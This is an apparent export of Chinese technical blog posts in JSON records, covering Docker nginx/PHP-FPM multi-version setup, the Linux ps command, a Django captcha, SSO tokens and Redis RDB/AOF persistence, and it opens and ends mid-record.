127.0.0.1:9000; fastcgi_pass yphp:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } }</code></p>\n\n<p>注意这里的<code>fastcgi_pass</code>已做改动。</p>\n\n<h2 id=\"autoid-1-0-0\">运行多个版本PHP</h2>\n\n<p><code id=\"copy_target_5\">docker run -d --restart=always --privileged --name yphp56 --env COLUMNS=`tput cols` --env LINES=`tput lines` -p 9000:9000 -p 9400-9499:9400-9499 \\ -v /work/:/work/ \\ -v \"/work/yphp/php/etc56/\":/usr/local/php/etc/ \\ php56-fpm-centos68-withext docker run -d --restart=always --privileged --name yphp --env COLUMNS=`tput cols` --env LINES=`tput lines` -p 9001:9000 -p 9500-9600:9500-9600 \\ -v /work/:/work/ \\ -v /work/:/alidata/ \\ -v \"/work/yphp/php/etc/\":/usr/local/php/etc/ \\ php71-fpm-centos68-phalcon-withext docker run -d --restart=always --name some-nginx -p 80-90:80-90 --link yphp56 --link yphp \\ -v /work/:/work/ \\ -v /work/yphp/nginx/conf/:/etc/nginx/ \\ -v /work/yphp/nginx/logs/:/etc/nginx/logs/ \\ daocloud.io/library/nginx:1.12.2-alpine</code></p>\n\n<p>对于使用了<code>--link</code>的nginx容器来说，php-fpm容器的<code>-p</code>参数实际没有产生作用，可以省略不写。</p>\n\n<p>这里面的<code>/work</code>对于宿主机来说都是同一个目录。</p>\n\n<p>使用<code>docker ps</code>查看状态是否都是<code>UP</code>：</p>\n\n<p><code id=\"copy_target_6\">$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 221c6ffb19dd daocloud.io/library/nginx:1.12.2-alpine \"nginx -g 'daemon of…\" 12 minutes ago Up 2 seconds 0.0.0.0:80-90-&gt;80-90/tcp some-nginx 02a4f9d804f7 php71-fpm-centos68-phalcon-withext \"/run.sh\" 24 minutes ago Up 3 seconds 80/tcp, 0.0.0.0:9001-&gt;9000/tcp yphp a9decc06558e php56-fpm-centos68-withext \"/run.sh\" 25 minutes ago Up 3 seconds 80/tcp, 0.0.0.0:9000-&gt;9000/tcp yphp56</code></p>\n\n<p>说明正常。</p>\n\n<p>如果本地是Mac或者Linux且安装的是Docker（非ToolBox之类），使用<code>127.0.0.1</code>就可以看到nginx已经运行了。添加<code>127.0.0.1 hello.cc</code>到<code>/etc/hosts</code>（非Windows）后访问http://hello.cc/可以看到phpinfo信息。试着修改<code>/work/yphp/nginx/conf/vhost/hello.cc.conf</code>里的<code>fastcgi_pass</code>端口为9001，然后重启nginx容器或者重启nginx容器里的nginx服务，会发现phpinfo显示的PHP版本变成了PHP7.1。</p>\n\n<p><code id=\"copy_target_7\"># 重启nginx容器 docker restart some-nginx # 重启nginx容器里的nginx服务 docker exec some-nginx nginx -s reload</code></p>\n\n<h2 id=\"autoid-2-0-0\">参考</h2>\n\n<p>1、docker容器连接问题：nginx 和 php-fpm --link后并无法正常解析php程序，求解<br><a href=\"https://segmentfault.com/q/1010000006148224/a-1020000013359135\" rel=\"nofollow\">https://segmentfault.com/q/1010000006148224/a-1020000013359135</a><br>\n2、在docker 上使用alpine linux建立简易静态网站 - CSDN博客<br><a href=\"http://blog.csdn.net/becivells/article/details/51599186\">http://blog.csdn.net/becivells/article/details/51599186</a><br>\n3、Docker多容器连接-以Nginx+PHP为例 - 程序猿成长计划 - SegmentFault 思否<br><a href=\"https://segmentfault.com/a/1190000002949036\" rel=\"nofollow\">https://segmentfault.com/a/1190000002949036</a><br>\n4、Nginx调用远程php-fpm - 指间&amp;流年 - 博客园<br><a href=\"https://www.cnblogs.com/feiyafeiblog/p/6938515.html\" rel=\"nofollow\">https://www.cnblogs.com/feiyafeiblog/p/6938515.html</a><br>\n5、基于boot2docker部署Docker环境 - 飞鸿影 - 博客园<br><a href=\"https://www.cnblogs.com/52fhy/p/8413029.html\" rel=\"nofollow\">https://www.cnblogs.com/52fhy/p/8413029.html</a></p>\n                                    </div>", "log_PostTime": 1584891159, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "ps命令使用详解", "log_Intro": "ps命令使用详解", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>ps：</strong>要对进程进行监测和控制,首先必须要了解当前进程的情况,也就是需要查看当前进程,而ps命令就是最基本同时也是非常强大的进程查看命令.使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵尸、哪些进程占用了过多的资源等等.总之大部分信息都是可以通过执行该命令得到的.</p>\n\n<p>ps命令最常用的还是用于监控后台进程的工作情况,因为后台进程是不和屏幕键盘这些标准输入/输出设备进行通信的,所以如果需要检测其情况,便可以使用ps命令了.</p>\n\n<p><strong>注意：</strong>ps是显示瞬间进程的状态，并不动态连续；如果想对进程进行实时监控应该用top命令。</p>\n\n<p>[root@lsbhjshyn ~]# man ps</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTQwMTIwMTEyMjAwNDIx?x-oss-process=image/format,png\"></p>\n\n<p>通过man ps可以获得ps的详细参数用法。下面可以通过示例看看效果：</p>\n\n<p>[root@lsbhjshyn ~]# ps aux</p>\n\n<p>[root@ lsbhjshyn ~]# ps -lA</p>\n\n<p>[root@ lsbhjshyn ~]# ps axjf</p>\n\n<p>参数：</p>\n\n<p>-A ：所有的进程均显示出来，与 -e 具有同样的效用；</p>\n\n<p>-a ： 显示现行终端机下的所有进程，包括其他用户的进程；</p>\n\n<p>-u ：以用户为主的进程状态 ；</p>\n\n<p>x ：通常与 a 这个参数一起使用，可列出较完整信息。</p>\n\n<p>输出格式规划：</p>\n\n<p>l ：较长、较详细的将该 PID 的的信息列出；</p>\n\n<p>j ：工作的格式 (jobs format)</p>\n\n<p>-f ：做一个更为完整的输出。</p>\n\n<p>特别说明：</p>\n\n<p>由于 ps 能够支持的系统类型相当的多，所以他的参数多的离谱！</p>\n\n<p>而且有没有加上 - 差很多！详细的用法应该要参考 man ps 喔！</p>\n\n<p>例1：将目前属于您自己这次登入的 PID 与相关信息列示出来</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTQwMTIwMTEyMjU5MTQw?x-oss-process=image/format,png\"></p>\n\n<p># 各相关信息的意义为：</p>\n\n<p># F 代表这个程序的旗标 (flag)， 4 代表使用者为 superuser；</p>\n\n<p># S 代表这个程序的状态 (STAT)；</p>\n\n<p>#UID 代表执行者身份</p>\n\n<p># PID 进程的ID号！底下的 PPID 则父进程的ID；</p>\n\n<p># C CPU 使用的资源百分比</p>\n\n<p># PRI指进程的执行优先权(Priority的简写)，其值越小越早被执行；</p>\n\n<p># NI 这个进程的nice值，其表示进程可被执行的优先级的修正数值。</p>\n\n<p># ADDR 这个是内核函数，指出该程序在内存的那个部分。如果是个执行</p>\n\n<p># 的程序，一般就是『 - 』</p>\n\n<p># SZ 使用掉的内存大小；</p>\n\n<p># WCHAN 目前这个程序是否正在运作当中，若为 - 表示正在运作；</p>\n\n<p># TTY 登入者的终端机位置啰；</p>\n\n<p># TIME 使用掉的 CPU 时间。</p>\n\n<p># CMD 所下达的指令名称</p>\n\n<p>例2：列出目前所有的正在内存当中的程序</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTQwMTIwMTEyMzIyMTU2?x-oss-process=image/format,png\"></p>\n\n<p>• USER：该进程属于那个使用者账号的？</p>\n\n<p>• PID ：该进程的进程ID号。</p>\n\n<p>• %CPU：该进程使用掉的 CPU 资源百分比；</p>\n\n<p>• %MEM：该进程所占用的物理内存百分比；</p>\n\n<p>• VSZ ：该进程使用掉的虚拟内存量 (Kbytes)</p>\n\n<p>• RSS ：该进程占用的固定的内存量 (Kbytes)</p>\n\n<p>• TTY ：该进程是在那个终端机上面运作，若与终端机无关，则显示 ?，另外， tty1-tty6 是本机上面的登入者程序，若为 pts/0 等等的，则表示为由网络连接进主机的程序。</p>\n\n<p>• STAT：该程序目前的状态，主要的状态有：</p>\n\n<p>   R ：该程序目前正在运作，或者是可被运作；</p>\n\n<p>   S ：该程序目前正在睡眠当中 (可说是 idle 状态啦！)，但可被某些讯号(signal) 唤醒。</p>\n\n<p>   T ：该程序目前正在侦测或者是停止了；</p>\n\n<p>   Z ：该程序应该已经终止，但是其父程序却无法正常的终止他，造成 zombie (疆尸) 程序的状态</p>\n\n<p>• START：该进程被触发启动的时间；</p>\n\n<p>• TIME ：该进程实际使用 CPU 运作的时间。</p>\n\n<p>• COMMAND：该程序的实际指令为什么？</p>\n\n<p>例3：以例一的显示内容，显示出所有的程序</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTQwMTIwMTEyNDI2MTU2?x-oss-process=image/format,png\"></p>\n\n<p>例4：列出类似程序树的程序显示</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTQwMTIwMTEyNDQxMzQz?x-oss-process=image/format,png\"></p>\n\n<p>例5：找出与 cron 与 syslog 这两个服务有关的 PID 号码</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTQwMTIwMTEyNTA0Mjgx?x-oss-process=image/format,png\"></p>\n                                    </div>", "log_PostTime": 1584891161, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 验证码4.4", "log_Intro": "Django 验证码4.4", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"验证码\">验证码</h1>\n\n<ul><li>在用户注册、登录页面，为了防止暴力请求，可以加入验证码功能，如果验证码错误，则不需要继续处理，可以减轻一些服务器的压力</li>\n\t<li>使用验证码也是一种有效的防止crsf的方法</li>\n\t<li>验证码效果如下图：</li>\n</ul><p><img alt=\"\" class=\"has\" height=\"35\" src=\"https://img-blog.csdnimg.cn/20191014215528972.png\" width=\"109\"></p>\n\n<p> </p>\n\n<p>验证码视图</p>\n\n<ul><li>新建viewsUtil.py，定义函数verifycode</li>\n\t<li>此段代码用到了PIL中的Image、ImageDraw、ImageFont模块，需要先安装Pillow（3.4.1）包，详细文档参考<a href=\"http://pillow.readthedocs.io/en/3.4.x/\" rel=\"nofollow\">http://pillow.readthedocs.io/en/3.4.x/</a></li>\n\t<li>Image表示画布对象</li>\n\t<li>ImageDraw表示画笔对象</li>\n\t<li>\n\t<p>ImageFont表示字体对象，ubuntu的字体路径为“/usr/share/fonts/truetype/freefont”</p>\n\t</li>\n\t<li>\n\t<p>代码如下：</p>\n\t</li>\n</ul><pre class=\"has\">\n<code>from django.http import HttpResponse\ndef verifycode(request):\n    #引入绘图模块\n    from PIL import Image, ImageDraw, ImageFont\n    #引入随机函数模块\n    import random\n    #定义变量，用于画面的背景色、宽、高\n    bgcolor = (random.randrange(20, 100), random.randrange(\n        20, 100), 255)\n    width = 100\n    height = 25\n    #创建画面对象\n    im = Image.new('RGB', (width, height), bgcolor)\n    #创建画笔对象\n    draw = ImageDraw.Draw(im)\n    #调用画笔的point()函数绘制噪点\n    for i in range(0, 100):\n        xy = (random.randrange(0, width), random.randrange(0, height))\n        fill = (random.randrange(0, 255), 255, random.randrange(0, 255))\n        draw.point(xy, fill=fill)\n    #定义验证码的备选值\n    str1 = 'ABCD123EFGHIJK456LMNOPQRS789TUVWXYZ0'\n    #随机选取4个值作为验证码\n    rand_str = ''\n    for i in range(0, 4):\n        rand_str += str1[random.randrange(0, len(str1))]\n    #构造字体对象\n    font = ImageFont.truetype('FreeMono.ttf', 23)\n    #构造字体颜色\n    fontcolor = (255, random.randrange(0, 255), random.randrange(0, 255))\n    #绘制4个字\n    draw.text((5, 2), rand_str[0], font=font, fill=fontcolor)\n    draw.text((25, 2), rand_str[1], font=font, fill=fontcolor)\n    draw.text((50, 2), rand_str[2], font=font, fill=fontcolor)\n    draw.text((75, 2), rand_str[3], font=font, fill=fontcolor)\n    #释放画笔\n    del draw\n    #存入session，用于做进一步验证\n    request.session['verifycode'] = rand_str\n    #内存文件操作\n    import cStringIO\n    buf = cStringIO.StringIO()\n    #将图片保存在内存中，文件类型为png\n    im.save(buf, 'png')\n    #将内存中的图片数据返回给客户端，MIME类型为图片png\n    return HttpResponse(buf.getvalue(), 'image/png')\n</code></pre>\n\n<p>配置url</p>\n\n<ul><li>在urls.py中定义请求验证码视图的url</li>\n</ul><pre class=\"has\">\n<code>from . import viewsUtil\n\nurlpatterns = [\n    url(r'^verifycode/$', viewsUtil.verifycode),\n]\n</code></pre>\n\n<p>显示验证码</p>\n\n<ul><li>在模板中使用img标签，src指向验证码视图</li>\n</ul><pre class=\"has\">\n<code>&lt;img id='verifycode' src=\"/verifycode/\" alt=\"CheckCode\"/&gt;\n</code></pre>\n\n<ul><li>启动服务器，查看显示成功</li>\n\t<li>扩展：点击“看不清，换一个”时，可以换一个新的验证码</li>\n</ul><pre class=\"has\">\n<code>&lt;script type=\"text/javascript\" src=\"/static/jquery-1.12.4.min.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\"&gt;\n    $(function(){\n        $('#verifycodeChange').css('cursor','pointer').click(function() {\n            $('#verifycode').attr('src',$('#verifycode').attr('src')+1)\n        });\n    });\n&lt;/script&gt;\n&lt;img id='verifycode' src=\"/verifycode/?1\" alt=\"CheckCode\"/&gt;\n&lt;span id='verifycodeChange'&gt;看不清，换一个&lt;/span&gt;\n</code></pre>\n\n<ul><li>为了能够实现提交功能，需要增加form和input标签</li>\n</ul><pre class=\"has\">\n<code>&lt;form method='post' action='/verifycodeValid/'&gt;\n    &lt;input type=\"text\" name=\"vc\"&gt;\n    &lt;img id='verifycode' src=\"/verifycode/?1\" alt=\"CheckCode\"/&gt;\n&lt;span id='verifycodeChange'&gt;看不清，换一个&lt;/span&gt;\n&lt;br&gt;\n&lt;input type=\"submit\" value=\"提交\"&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>验证</p>\n\n<ul><li>接收请求的信息，与session中的内容对比</li>\n</ul><pre class=\"has\">\n<code>from django.http import HttpResponse\n\ndef verifycodeValid(request):\n    vc = request.POST['vc']\n    if vc.upper() == request.session['verifycode']:\n        return HttpResponse('ok')\n    else:\n        return HttpResponse('no')\n</code></pre>\n\n<ul><li>配置验证处理的url</li>\n</ul><pre class=\"has\">\n<code>urlpatterns = [\n    url(r'^verifycodeValid/$', views.verifycodeValid),\n]\n</code></pre>\n\n<p>第三方</p>\n\n<ul><li>可以在网上搜索“验证码”，找到一些第三方验证码提供网站，阅读文档，使用到项目中</li>\n</ul>                                    </div>", "log_PostTime": 1584891162, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "深入理解跨域SSO单点登录原理与技术", "log_Intro": "深入理解跨域SSO单点登录原理与技术", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"一sso体系结构\">一：SSO体系结构</h2>\n\n<h3 id=\"sso\">SSO</h3>\n\n<p>​ SSO英文全称Single Sign On，单点登录。SSO是在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统。它包括可以将这次主要的登录映射到其他应用中用于同一个用户的登录的机制。它是目前比较流行的企业业务整合的解决方案之一。</p>\n\n<h3 id=\"体系结构\">体系结构</h3>\n\n<p>​ 当用户第一次访问应用系统1的时候，因为还没有登录，会被引导到认证系统中进行登录；根据用户提供的登录信息，认证系统进行身份校验，如果通过校验，应该返回给用户一个认证的凭据－－token；用户再访问别的应用的时候就会将这个token带上，作为自己认证的凭据，应用系统接受到请求之后会把token送到认证系统进行校验，检查token的合法性。如果通过校验，用户就可以在不用再次登录的情况下访问应用系统2和应用系统3了 。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTEzNjY3Mi8yMDE4MDgvMTEzNjY3Mi0yMDE4MDgxNDE4MTEwMTcwNi0xNjAwMDY4MjQxLnBuZw?x-oss-process=image/format,png\"></p>\n\n<h3 id=\"token令牌\">Token（令牌）</h3>\n\n<p>token的意思是“令牌”，是服务端生成的一串字符串，作为客户端进行请求的一个标识。</p>\n\n<p>当用户第一次登录后，服务器生成一个token并将此token返回给客户端，客户端收到token后把它存储起来，可以放在cookie或者Local Storage（本地存储）里。 以后客户端只需带上这个token前来请求数据即可，无需再次带上用户名和密码。</p>\n\n<p>简单token的组成；uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token的前几位以哈希算法压缩成的一定长度的十六进制字符串。为防止token泄露）。</p>\n\n<p><strong>设计token的</strong></p>                                    </div>", "log_PostTime": 1584891164, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Redis持久化 - RDB和AOF", "log_Intro": "Redis持久化 - RDB和AOF", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"articleHeader0\">一、持久化的作用</h2>\n\n<h3 id=\"articleHeader1\">1. 什么是持久化</h3>\n\n<p>持久化（Persistence），即把数据（如内存中的对象）保存到可永久保存的存储设备中（如磁盘）。<br>\n持久化Redis所有数据保持在内存中，对数据的更新将异步地保存到磁盘上。</p>\n\n<p><img alt=\"Redis持久化\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9yZW1vdGUvMTQ2MDAwMDAxNjAyMTIyMA?x-oss-process=image/format,png\"></p>\n\n<h3 id=\"articleHeader2\">2. 持久化的实现方式</h3>\n\n<p><strong>快照方式持久化</strong></p>\n\n<p>快照方式持久化就是在某时刻把所有数据进行完整备份。</p>\n\n<p>例：Mysql的Dump方式、Redis的RDB方式。</p>\n\n<p><strong>写日志方式持久化</strong></p>\n\n<p>写日志方式持久化就是把用户执行的所有写指令（增删改）备份到文件中，还原数据时只需要把备份的所有指令重新执行一遍即可。</p>\n\n<p>例：Mysql的Binlog、Redis的AOF、Hbase的HLog。</p>\n\n<h2 id=\"articleHeader3\">二、RDB</h2>\n\n<h3 id=\"articleHeader4\">1. 什么是RDB</h3>\n\n<p><strong>RDB简介</strong></p>\n\n<p><img alt=\"RDB持久化\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9yZW1vdGUvMTQ2MDAwMDAxNjAyMTIyMQ?x-oss-process=image/format,png\"></p>\n\n<p>RDB持久化方式能够在指定的时间间隔能对你的数据进行快照存储。<br>\n在默认情况下， Redis 将数据库快照保存在名字为 dump.rdb的二进制文件中。<br>\n在 Redis 运行时， RDB 程序将当前内存中的数据库快照保存到磁盘文件中， 在 Redis 重启动时， RDB 程序可以通过载入 RDB 文件来还原数据库的状态。</p>\n\n<p><strong>工作方式</strong></p>\n\n<p>当 Redis 需要保存 dump.rdb 文件时， 服务器执行以下操作:</p>\n\n<ol><li>Redis 调用forks。同时拥有父进程和子进程。</li>\n\t<li>子进程将数据集写入到一个临时 RDB 文件中。</li>\n\t<li>当子进程完成对新 RDB 文件的写入时，Redis 用新 RDB 文件替换原来的 RDB 文件，并删除旧的 RDB 文件。</li>\n</ol><p>这种工作方式使得 Redis 可以从写时复制（copy-on-write）机制中获益。</p>\n\n<h3 id=\"articleHeader5\">2. RDB的三种主要触发机制</h3>\n\n<p><strong>save命令（同步数据到磁盘上）</strong></p>\n\n<p><code>save</code> 命令执行一个同步操作，以RDB文件的方式保存所有数据的快照。</p>\n\n<pre class=\"has\">\n<code>127.0.0.1:6379&gt; save\nOK\n</code></pre>\n\n<p><img alt=\"save命令\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9yZW1vdGUvMTQ2MDAwMDAxNjAyMTIyMg?x-oss-process=image/format,png\"></p>\n\n<p>由于 <code>save</code> 命令是同步命令，会占用Redis的主进程。若Redis数据非常多时，<code>save</code>命令执行速度会非常慢，阻塞所有客户端的请求。<br>\n因此很少在生产环境直接使用SAVE 命令，可以使用BGSAVE 命令代替。如果在BGSAVE命令的保存数据的子进程发生错误的时，用 SAVE命令保存最新的数据是最后的手段。</p>\n\n<p><img alt=\"save命令阻塞所有客户端的请求\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9yZW1vdGUvMTQ2MDAwMDAxNjAyMTIyMw?x-oss-process=image/format,png\"></p>\n\n<p><strong>bgsave命令（异步保存数据到磁盘上）</strong></p>\n\n<p><code>bgsave</code> 命令执行一个异步操作，以RDB文件的方式保存所有数据的快照。</p>\n\n<pre class=\"has\">\n<code>127.0.0.1:6379&gt; bgsave\nBackground saving started\n</code></pre>\n\n<p>Redis使用Linux系统的<code>fock()</code>生成一个子进程来将DB数据保存到磁盘，主进程继续提供服务以供客户端调用。<br>\n如果操作成功，可以通过客户端命令LASTSAVE来检查操作结果。</p>\n\n<p><img alt=\"bgsave命令\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9yZW1vdGUvMTQ2MDAwMDAxNjAyMTIyNA?x-oss-process=image/format,png\"></p>\n\n<p><strong><code>save</code> 与 <code>bgsave</code> 对比</strong></p>\n\n<table><thead><tr><th>命令</th>\n\t\t\t<th>save</th>\n\t\t\t<th>bgsave</th>\n\t\t</tr></thead><tbody><tr><td>IO类型</td>\n\t\t\t<td>同步</td>\n\t\t\t<td>异步</td>\n\t\t</tr><tr><td>阻塞？</td>\n\t\t\t<td>是</td>\n\t\t\t<td>是（阻塞发生在fock()，通常非常快）</td>\n\t\t</tr><tr><td>复杂度</td>\n\t\t\t<td>O(n)</td>\n\t\t\t<td>O(n)</td>\n\t\t</tr><tr><td>优点</td>\n\t\t\t<td>不会消耗额外的内存</td>\n\t\t\t<td>不阻塞客户端命令</td>\n\t\t</tr><tr><td>缺点</td>\n\t\t\t<td>阻塞客户端命令</td>\n\t\t\t<td>需要fock子进程，消耗内存</td>\n\t\t</tr></tbody></table><p><strong>自动生成RDB</strong></p>\n\n<p>除了手动执行 <code>save</code> 和 <code>bgsave</code> 命令实现RDB持久化以外，Redis还提供了自动自动生成RDB的方式。</p>\n\n<p>你可以通过配置文件对 Redis 进行设置， 让它在“ N 秒内数据集至少有 M 个改动”这一条件被满足时， 自动进行数据集保存操作。<br>\n比如说， 以下设置会让 Redis 在满足“ 60 秒内有至少有 1000 个键被改动”这一条件时， 自动进行数据集保存操作:</p>\n\n<pre class=\"has\">\n<code>save 60 1000\n</code></pre>\n\n<p><img alt=\"自动生成RDB\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9yZW1vdGUvMTQ2MDAwMDAxNjAyMTIyNQ?x-oss-process=image/format,png\"></p>\n\n<h3 id=\"articleHeader6\">3. RDB相关配置</h3>\n\n<pre class=\"has\">\n<code># RDB自动持久化规则\n# 当 900 秒内有至少有 1 个键被改动时，自动进行数据集保存操作\nsave 900 1\n# 当 300 秒内有至少有 10 个键被改动时，自动进行数据集保存操作\nsave 300 10\n# 当 60 秒内有至少有 10000 个键被改动时，自动进行数据集保存操作\nsave 60 10000\n\n# RDB持久化文件名\ndbfilename dump-&lt;port&gt;.rdb\n\n# 数据持久化文件存储目录\ndir /var/lib/redis\n\n# bgsave发生错误时是否停止写入，通常为yes\nstop-writes-on-bgsave-error yes\n\n# rdb文件是否使用压缩格式\nrdbcompression yes\n\n# 是否对rdb文件进行校验和检验，通常为yes\nrdbchecksum yes</code></pre>\n\n<h3 id=\"articleHeader7\">4. RDB的优点</h3>\n\n<ol><li>RDB是一个非常紧凑的文件，它保存了某个时间点得数据集，非常适用于数据集的备份，比如你可以在每个小时报保存一下过去24小时内的数据，同时每天保存过去30天的数据，这样即使出了问题你也可以根据需求恢复到不同版本的数据集。</li>\n\t<li>RDB是一个紧凑的单一文件，很方便传送到另一个远端数据中心或者亚马逊的S3（可能加密），非常适用于灾难恢复。</li>\n\t<li>RDB在保存RDB文件时父进程唯一需要做的就是fork出一个子进程，接下来的工作全部由子进程来做，父进程不需要再做其他IO操作，所以RDB持久化方式可以最大化redis的性能。</li>\n\t<li>与AOF相比，在恢复大的数据集的时候，RDB方式会更快一些。</li>\n</ol><h3 id=\"articleHeader8\">5. RDB的缺点</h3>\n\n<ol><li>耗时、耗性能。RDB 需要经常fork子进程来保存数据集到硬盘上，当数据集比较大的时候，fork的过程是非常耗时的，可能会导致Redis在一些毫秒级内不能响应客户端的请求。如果数据集巨大并且CPU性能不是很好的情况下，这种情况会持续1秒，AOF也需要fork，但是你可以调节重写日志文件的频率来提高数据集的耐久度。</li>\n\t<li>不可控、丢失数据。如果你希望在redis意外停止工作（例如电源中断）的情况下丢失的数据最少的话，那么RDB不适合你。虽然你可以配置不同的save时间点(例如每隔5分钟并且对数据集有100个写的操作)，是Redis要完整的保存整个数据集是一个比较繁重的工作，你通常会每隔5分钟或者更久做一次完整的保存，万一在Redis意外宕机，你可能会丢失几分钟的数据。</li>\n</ol><h2 id=\"articleHeader9\">三、AOF</h2>\n\n<h3 id=\"articleHeader10\">1. 什么是AOF</h3>\n\n<p>快照功能（RDB）并不是非常耐久（durable）： 如果 Redis 因为某些原因而造成故障停机， 那么服务器将丢失最近写入、且仍未保存到快照中的那些数据。 从 1.1 版本开始， Redis 增加了一种完全耐久的持久化方式： AOF 持久化。<br>\n你可以在配置文件中打开AOF方式:</p>\n\n<pre class=\"has\">\n<code>appendonly yes\n</code></pre>\n\n<p>打开AOF后， 每当 Redis 执行一个改变数据集的命令时（比如 SET）， 这个命令就会被追加到 AOF 文件的末尾。这样的话， 当 Redis 重新启时， 程序就可以通过重新执行 AOF 文件中的命令来达到重建数据集的目的。</p>\n\n<p><strong>AOF运行原理 - 创建</strong></p>\n\n<p><img alt=\"创建AOF\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9yZW1vdGUvMTQ2MDAwMDAxNjAyMTIyNg?x-oss-process=image/format,png\"></p>\n\n<p><strong>AOF运行原理 - 恢复</strong></p>\n\n<p><img alt=\"AOF运行原理 - 恢复\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9yZW1vdGUvMTQ2MDAwMDAxNjAyMTIyNw?x-oss-process=image/format,png\"></p>\n\n<h3 id=\"articleHeader11\">2. AOF持久化的三种策略</h3>\n\n<p>你可以通过配置文件配置 Redis 多久才将数据 fsync 到磁盘一次。</p>\n\n<p><strong>always</strong></p>\n\n<p>每次有新命令追加到 AOF 文件时就执行一次 fsync ：非常慢，也非常安全。</p>\n\n<p><img alt=\"always\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9yZW1vdGUvMTQ2MDAwMDAxNjAyMTIyOA?x-oss-process=image/format,png\"></p>\n\n<p><strong>everysec</strong></p>\n\n<p>每秒 fsync 一次：足够快（和使用 RDB 持久化差不多），并且在故障时只会丢失 1 秒钟的数据。<br>\n推荐（并且也是默认）的措施为每秒 fsync 一次， 这种 fsync 策略可以兼顾速度和安全性。</p>\n\n<p><img alt=\"everysec\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9yZW1vdGUvMTQ2MDAwMDAxNjAyMTIyOQ?x-oss-process=image/format,png\"></p>\n\n<p><strong>no</strong></p>\n\n<p>从不 fsync ：将数据交给操作系统来处理，由操作系统来决定什么时候同步数据。更快，也更不安全的选择。</p>\n\n<p><img alt=\"no\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9yZW1vdGUvMTQ2MDAwMDAxNjAyMTIzMA?x-oss-process=image/format,png\"></p>\n\n<p><strong>always、everysec、no对比</strong></p>\n\n<table><thead><tr><th>命令</th>\n\t\t\t<th>优点</th>\n\t\t\t<th>缺点</th>\n\t\t</tr></thead><tbody><tr><td>always</td>\n\t\t\t<td>不丢失数据</td>\n\t\t\t<td>IO开销大，一般SATA磁盘只有几百TPS</td>\n\t\t</tr><tr><td>everysec</td>\n\t\t\t<td>每秒进行与fsync，最多丢失1秒数据</td>\n\t\t\t<td>可能丢失1秒数据</td>\n\t\t</tr><tr><td>no</td>\n\t\t\t<td>不用管</td>\n\t\t\t<td>不可控</td>\n\t\t</tr></tbody></table><p>推荐（并且也是默认）的措施为每秒 fsync 一次， 这种 fsync 策略可以兼顾速度和安全性。</p>\n\n<h3 id=\"articleHeader12\">3. AOF重写</h3>\n\n<p>因为 AOF 的运作方式是不断地将命令追加到文件的末尾， 所以随着写入命令的不断增加， AOF 文件的体积也会变得越来越大。举个例子， 如果你对一个计数器调用了 100 次 INCR ， 那么仅仅是为了保存这个计数器的当前值， AOF 文件就需要使用 100 条记录（entry）。然而在实际上， 只使用一条 SET 命令已经足以保存计数器的当前值了， 其余 99 条记录实际上都是多余的。<br>\n为了处理这种情况， Redis 支持一种有趣的特性： 可以在不打断服务客户端的情况下， 对 AOF 文件进行重建（rebuild）。执行 bgrewriteaof 命令， Redis 